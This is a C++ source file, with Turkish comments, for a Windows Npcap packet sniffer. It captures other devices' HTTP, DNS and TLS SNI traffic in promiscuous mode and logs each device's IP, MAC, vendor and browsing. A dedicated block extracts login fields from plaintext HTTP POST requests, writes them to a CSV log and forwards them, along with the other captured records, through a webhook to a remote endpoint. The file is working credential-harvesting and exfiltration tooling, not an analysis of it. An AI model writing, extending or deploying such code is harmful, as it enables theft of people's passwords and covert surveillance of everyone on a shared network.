#include "capture.hpp"
#include "parser.hpp"
#include "display.hpp"
#include "webhook.hpp"
#include "tls_sniffer.hpp"
#include "credential.hpp"
#include "device_info.hpp"
#include "../config.hpp"

// Npcap/WinPcap headers
// SDK'nın Include ve Lib klasörlerini CMakeLists'te ayarlıyoruz
#include <pcap.h>

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <atomic>
#include <mutex>
#include <thread>

// ============================================================
//  capture.cpp — Npcap paket yakalama döngüsü
// ============================================================

namespace Capture {

    static std::atomic<bool>  g_running{ false };
    static pcap_t*            g_handle  = nullptr;
    static std::mutex         g_handle_mutex;
    static Stats              g_stats;
    static std::mutex         g_stats_mutex;

    static HTTPCallback g_http_cb;
    static DNSCallback  g_dns_cb;

    static std::ofstream g_log_file;

    void SetHTTPCallback(HTTPCallback cb) { g_http_cb = std::move(cb); }
    void SetDNSCallback(DNSCallback  cb)  { g_dns_cb  = std::move(cb); }

    Stats GetStats() {
        std::lock_guard<std::mutex> lock(g_stats_mutex);
        return g_stats;
    }

    void PrintStats() {
        auto s = GetStats();
        Display::PrintSeparator();
        Display::PrintInfo("İstatistikler:");
        std::cout << "  Toplam paket : " << s.total_packets  << "\n";
        std::cout << "  HTTP paketi  : " << s.http_packets    << "\n";
        std::cout << "  DNS sorgusu  : " << s.dns_packets     << "\n";
        std::cout << "  Webhook ✓    : " << s.webhook_sent    << "\n";
        std::cout << "  Webhook ✗    : " << s.webhook_failed  << "\n";
        Display::PrintSeparator();
    }

    // ─── Log to file ──────────────────────────────────────────────────────────
    static void LogToFile(const std::string& line) {
        if (Config::LOG_TO_FILE && g_log_file.is_open()) {
            g_log_file << line << "\n";
            g_log_file.flush();
        }
    }

    // ─── Paket işleme callback'i (pcap_loop'a verilir) ───────────────────────
    static void PacketHandler(u_char* /*user*/,
                               const struct pcap_pkthdr* header,
                               const u_char* pkt_data)
    {
        if (!g_running.load()) return;

        {
            std::lock_guard<std::mutex> lock(g_stats_mutex);
            ++g_stats.total_packets;
        }

        int len = (int)header->caplen;
        if (len < 14) return;  // En az Ethernet header lazım

        std::string ts = Display::GetTimestamp();

        // ── HTTP Dene ──────────────────────────────────────────────────────
        Parser::HTTPPacket http_pkt;
        if (Parser::ParseHTTP(pkt_data, len, http_pkt)) {
            {
                std::lock_guard<std::mutex> lock(g_stats_mutex);
                ++g_stats.http_packets;
            }

            if (Config::TERMINAL_OUTPUT) {
                Display::PrintHTTP(
                    ts,
                    http_pkt.src_ip, http_pkt.dst_ip,
                    http_pkt.src_mac, http_pkt.vendor,
                    http_pkt.method, http_pkt.host, http_pkt.path,
                    http_pkt.user_agent, http_pkt.os_guess,
                    http_pkt.content_type,
                    http_pkt.src_port, http_pkt.dst_port
                );
            }

            // Log dosyasına yaz (CSV formatı)
            // Sütunlar: timestamp,type,method,full_url,src_ip,src_port,src_mac,vendor,os,browser,referer,user_agent
            std::string full_url = "http://";
            if (!http_pkt.host.empty()) full_url += http_pkt.host;
            if (!http_pkt.path.empty()) full_url += http_pkt.path;

            // CSV'de virgül ve tırnak sorunlarını önle — basit quote wrap
            auto csv_field = [](const std::string& s) -> std::string {
                std::string out = "\"";
                for (char c : s) {
                    if (c == '"') out += "\"\"";  // " → "" (CSV escape)
                    else out += c;
                }
                out += "\"";
                return out;
            };

            std::ostringstream log_line;
            log_line << ts                            << ","
                     << "HTTP"                        << ","
                     << csv_field(http_pkt.method)    << ","
                     << csv_field(full_url)            << ","
                     << csv_field(http_pkt.src_ip)    << ","
                     << http_pkt.src_port              << ","
                     << csv_field(http_pkt.dst_ip)    << ","
                     << http_pkt.dst_port              << ","
                     << csv_field(http_pkt.src_mac)   << ","
                     << csv_field(http_pkt.vendor)    << ","
                     << csv_field(http_pkt.os_guess)  << ","
                     << csv_field(http_pkt.browser)   << ","
                     << csv_field(http_pkt.content_type) << ","
                     << csv_field(http_pkt.referer)   << ","
                     << csv_field(http_pkt.user_agent);
            LogToFile(log_line.str());

            // Webhook
            if (Webhook::IsEnabled()) {
                bool ok = Webhook::SendHTTP(http_pkt);
                std::lock_guard<std::mutex> lock(g_stats_mutex);
                if (ok) ++g_stats.webhook_sent;
                else    ++g_stats.webhook_failed;
            }

            // Özel callback varsa çağır
            if (g_http_cb) g_http_cb(http_pkt);
            return;
        }

        // ── DNS Dene ──────────────────────────────────────────────────────
        if (Config::CAPTURE_DNS) {
            Parser::DNSPacket dns_pkt;
            if (Parser::ParseDNS(pkt_data, len, dns_pkt)) {
                {
                    std::lock_guard<std::mutex> lock(g_stats_mutex);
                    ++g_stats.dns_packets;
                }

                if (Config::TERMINAL_OUTPUT) {
                    for (const auto& domain : dns_pkt.queries) {
                        Display::PrintDNS(ts, dns_pkt.src_ip, dns_pkt.src_mac,
                                           dns_pkt.vendor, domain);
                    }
                }

                // Log (DNS — her domain için ayrı satır)
                for (const auto& domain : dns_pkt.queries) {
                    std::ostringstream log_line;
                    log_line << ts                              << ","
                             << "DNS"                           << ","
                             << "\"\""                          << ","  // method yok
                             << "\"" << domain << "\""          << ","  // full_url yerine domain
                             << "\"" << dns_pkt.src_ip  << "\"" << ","
                             << "\"\""                          << ","  // src_port yok
                             << "\"\""                          << ","  // dst_ip yok
                             << "\"\""                          << ","  // dst_port yok
                             << "\"" << dns_pkt.src_mac << "\"" << ","
                             << "\"" << dns_pkt.vendor  << "\"" << ","
                             << "\"\",\"\",\"\",\"\",\"\"";     // os,browser,ct,referer,ua yok
                    LogToFile(log_line.str());
                }

                // Webhook
                if (Webhook::IsEnabled()) {
                    bool ok = Webhook::SendDNS(dns_pkt);
                    std::lock_guard<std::mutex> lock(g_stats_mutex);
                    if (ok) ++g_stats.webhook_sent;
                    else    ++g_stats.webhook_failed;
                }

                if (g_dns_cb) g_dns_cb(dns_pkt);
            }
        }

        // ── TLS/HTTPS SNI Dene ────────────────────────────────────────────
        TLSSniffer::TLSPacket tls_pkt;
        if (TLSSniffer::ParseSNI(pkt_data, len, tls_pkt)) {
            {
                std::lock_guard<std::mutex> lock(g_stats_mutex);
                ++g_stats.tls_packets;
            }

            if (Config::TERMINAL_OUTPUT) {
                Display::PrintTLS(ts, tls_pkt.src_ip, tls_pkt.dst_ip,
                                   tls_pkt.src_mac, tls_pkt.vendor,
                                   tls_pkt.sni, tls_pkt.tls_version,
                                   tls_pkt.src_port, tls_pkt.dst_port);
            }

            // Log
            std::ostringstream tls_log;
            tls_log << ts             << ","
                    << "TLS"          << ","
                    << "CONNECT"      << ","
                    << "\"https://" << tls_pkt.sni << "\"" << ","
                    << "\"" << tls_pkt.src_ip  << "\"" << ","
                    << tls_pkt.src_port          << ","
                    << "\"" << tls_pkt.dst_ip  << "\"" << ","
                    << tls_pkt.dst_port          << ","
                    << "\"" << tls_pkt.src_mac << "\"" << ","
                    << "\"" << tls_pkt.vendor  << "\"" << ","
                    << "\"" << tls_pkt.tls_version << "\"" << ","
                    << "\"\",\"\",\"\",\"\"";
            LogToFile(tls_log.str());

            // Webhook (TLS için de gönder)
            if (Webhook::IsEnabled()) {
                bool ok = Webhook::SendTLS(tls_pkt);
                std::lock_guard<std::mutex> lock(g_stats_mutex);
                if (ok) ++g_stats.webhook_sent;
                else    ++g_stats.webhook_failed;
            }
        }

        // ── Credential Extraction (HTTP POST üzerinde) ────────────────────
        // NOT: ParseHTTP'den geçmiş bir pkt için tekrar ham veri lazım
        // Bu blok kendi içinde POST kontrolü yapar
        {
            // Ham payload'ı tekrar al (sadece TCP port 80/8080 için)
            // HTTP parse başarılıysa zaten yukarıda işlendi, burada credential'ları çıkarıyoruz
            const uint8_t* eth_data = pkt_data;
            if (len >= 14 + 20 + 20) {
                const uint8_t* ip_start2 = eth_data + 14;
                uint8_t ip_proto = ip_start2[9];
                if (ip_proto == 6) {
                    int ip_hl = (ip_start2[0] & 0x0F) * 4;
                    const uint8_t* tcp_start2 = ip_start2 + ip_hl;
                    uint16_t dst_p = (tcp_start2[2] << 8) | tcp_start2[3];
                    if (dst_p == 80 || dst_p == 8080 || dst_p == 8000) {
                        int tcp_hl = ((tcp_start2[12] >> 4) & 0x0F) * 4;
                        const uint8_t* payload2 = tcp_start2 + tcp_hl;
                        int plen = len - (int)(payload2 - pkt_data);
                        if (plen > 0 && memcmp(payload2, "POST ", 5) == 0) {
                            std::string raw_http(reinterpret_cast<const char*>(payload2),
                                                  std::min(plen, 8192));

                            // IP/MAC bilgileri
                            std::string c_src_ip  = DeviceInfo::FormatIP(*reinterpret_cast<const uint32_t*>(ip_start2 + 12));
                            std::string c_src_mac = DeviceInfo::FormatMAC(eth_data + 6);
                            std::string c_vendor  = DeviceInfo::LookupVendor(eth_data + 6);
                            std::string c_host    = Parser::ExtractHTTPHeader(raw_http, "Host");
                            std::string c_path;
                            {
                                auto sp1 = raw_http.find(' ');
                                auto sp2 = (sp1 != std::string::npos) ? raw_http.find(' ', sp1+1) : std::string::npos;
                                if (sp1 != std::string::npos && sp2 != std::string::npos)
                                    c_path = raw_http.substr(sp1+1, sp2-sp1-1);
                            }

                            Credential::CredEntry cred;
                            if (Credential::Extract(raw_http, c_src_ip, c_src_mac, c_vendor,
                                                     c_host, c_path, cred))
                            {
                                std::lock_guard<std::mutex> lock(g_stats_mutex);
                                ++g_stats.cred_packets;

                                if (Config::TERMINAL_OUTPUT) {
                                    Display::PrintCredential(ts, cred);
                                }

                                // Credential log
                                std::ostringstream cred_log;
                                cred_log << ts << ",CRED,POST,"
                                         << "\"http://" << cred.host << cred.path << "\","
                                         << "\"" << cred.src_ip << "\",,,,"
                                         << "\"" << cred.src_mac << "\","
                                         << "\"" << cred.vendor << "\",,,,,\"";
                                for (const auto& [k, v] : cred.fields) {
                                    cred_log << k << "=" << v << "; ";
                                }
                                cred_log << "\"";
                                LogToFile(cred_log.str());

                                if (Webhook::IsEnabled()) {
                                    bool ok = Webhook::SendCredential(cred);
                                    std::lock_guard<std::mutex> lock2(g_stats_mutex);
                                    if (ok) ++g_stats.webhook_sent;
                                    else    ++g_stats.webhook_failed;
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    // ─── Interface Listesi ────────────────────────────────────────────────────
    void ListInterfaces() {
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_if_t* alldevs = nullptr;

        if (pcap_findalldevs(&alldevs, errbuf) != 0) {
            Display::PrintError(std::string("Interface listelenemedi: ") + errbuf);
            return;
        }

        Display::PrintInfo("Mevcut ağ arayüzleri:");
        Display::PrintSeparator();

        int idx = 1;
        for (pcap_if_t* d = alldevs; d != nullptr; d = d->next) {
            // IP adresini bul
            std::string ip_str;
            for (pcap_addr_t* a = d->addresses; a != nullptr; a = a->next) {
                if (a->addr && a->addr->sa_family == AF_INET) {
                    char buf[INET_ADDRSTRLEN];
                    struct sockaddr_in* sin = (struct sockaddr_in*)a->addr;
                    inet_ntop(AF_INET, &sin->sin_addr, buf, sizeof(buf));
                    ip_str = buf;
                    break;
                }
            }

            std::string desc = d->description ? d->description : "";
            // Npcap device name çok uzun olabilir, sadece kısa kısmı göster
            std::string name = d->name;
            if (name.size() > 50) name = name.substr(0, 50) + "...";

            Display::PrintInterface(idx++, name, desc, ip_str);
        }

        Display::PrintSeparator();
        pcap_freealldevs(alldevs);
    }

    // ─── En İyi Interface'i Seç ───────────────────────────────────────────────
    // IP'si olan ve loopback olmayan ilk adaptörü döner
    static pcap_if_t* FindBestInterface(pcap_if_t* alldevs) {
        // Önce TTNet/modem IP aralığında olanı ara (192.168.x.x, 10.x.x.x, 172.x.x.x)
        for (pcap_if_t* d = alldevs; d != nullptr; d = d->next) {
            if (d->flags & PCAP_IF_LOOPBACK) continue;
            for (pcap_addr_t* a = d->addresses; a != nullptr; a = a->next) {
                if (a->addr && a->addr->sa_family == AF_INET) {
                    return d;  // IP'si olan ilk non-loopback interface
                }
            }
        }
        // Hiç bulunamazsa ilk olanı dön
        return alldevs;
    }

    // ─── Yakalamayı Başlat ────────────────────────────────────────────────────
    bool Start(int interface_idx) {
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_if_t* alldevs = nullptr;

        if (pcap_findalldevs(&alldevs, errbuf) != 0) {
            Display::PrintError(std::string("Interface bulunamadı: ") + errbuf);
            return false;
        }

        pcap_if_t* selected = nullptr;

        if (interface_idx <= 0) {
            // Otomatik seç
            selected = FindBestInterface(alldevs);
        } else {
            // Kullanıcı seçti
            int idx = 1;
            for (pcap_if_t* d = alldevs; d != nullptr; d = d->next) {
                if (idx == interface_idx) {
                    selected = d;
                    break;
                }
                ++idx;
            }
        }

        if (!selected) {
            Display::PrintError("Geçerli interface bulunamadı!");
            pcap_freealldevs(alldevs);
            return false;
        }

        Display::PrintInfo(std::string("Interface: ") +
                            (selected->description ? selected->description : selected->name));

        // Log dosyasını aç — yeni dosyaysa CSV header ekle
        if (Config::LOG_TO_FILE) {
            // Dosya var mı kontrol et (header tekrarlanmasın)
            bool file_exists = false;
            {
                std::ifstream check(Config::LOG_FILE);
                file_exists = check.good();
            }
            g_log_file.open(Config::LOG_FILE, std::ios::app);
            if (g_log_file.is_open()) {
                Display::PrintInfo("Log dosyası: " + Config::LOG_FILE);
                // Yeni dosyaysa başlık satırı yaz (Excel'de direkt açılabilir)
                if (!file_exists) {
                    g_log_file << "timestamp,type,method,full_url,src_ip,src_port,"
                               << "dst_ip,dst_port,src_mac,vendor,os,browser,"
                               << "content_type,referer,user_agent\n";
                    g_log_file.flush();
                }
            }
        }

        // Adaptörü aç
        int promisc = Config::PROMISCUOUS ? 1 : 0;
        g_handle = pcap_open_live(
            selected->name,
            65535,      // snaplen: tüm paketi yakala
            promisc,    // promiscuous mode
            100,        // read timeout (ms)
            errbuf
        );

        pcap_freealldevs(alldevs);

        if (!g_handle) {
            Display::PrintError(std::string("Adaptör açılamadı: ") + errbuf);
            return false;
        }

        // Sadece IP trafiğini al (Ethernet)
        if (pcap_datalink(g_handle) != DLT_EN10MB) {
            Display::PrintError("Bu araç sadece Ethernet adaptörlerini destekler!");
            pcap_close(g_handle);
            g_handle = nullptr;
            return false;
        }

        // BPF filtresi uygula
        struct bpf_program fp;
        bpf_u_int32 net = 0, mask = 0;
        pcap_lookupnet(selected->name, &net, &mask, errbuf);

        if (pcap_compile(g_handle, &fp, Config::BPF_FILTER.c_str(), 0, mask) == -1) {
            Display::PrintError(std::string("BPF filtresi derlenemedi: ") + pcap_geterr(g_handle));
            // Filtresiz devam et
        } else {
            pcap_setfilter(g_handle, &fp);
            pcap_freecode(&fp);
        }

        Display::PrintInfo("BPF Filtresi: " + Config::BPF_FILTER);
        Display::PrintInfo(std::string("Promiscuous mode: ") + (promisc ? "AÇIK" : "KAPALI"));
        Display::PrintInfo("Yakalama başlıyor... (Ctrl+C ile durdur)");
        Display::PrintSeparator();

        g_running.store(true);

        // Yakalama döngüsü (blocking, -1 = sonsuz)
        pcap_loop(g_handle, -1, PacketHandler, nullptr);

        // Döngü bitti (Stop() çağrıldı)
        pcap_close(g_handle);
        g_handle = nullptr;
        g_running.store(false);

        if (g_log_file.is_open()) g_log_file.close();

        return true;
    }

    // ─── Durdur ───────────────────────────────────────────────────────────────
    void Stop() {
        g_running.store(false);
        std::lock_guard<std::mutex> lock(g_handle_mutex);
        if (g_handle) {
            pcap_breakloop(g_handle);
        }
    }
}
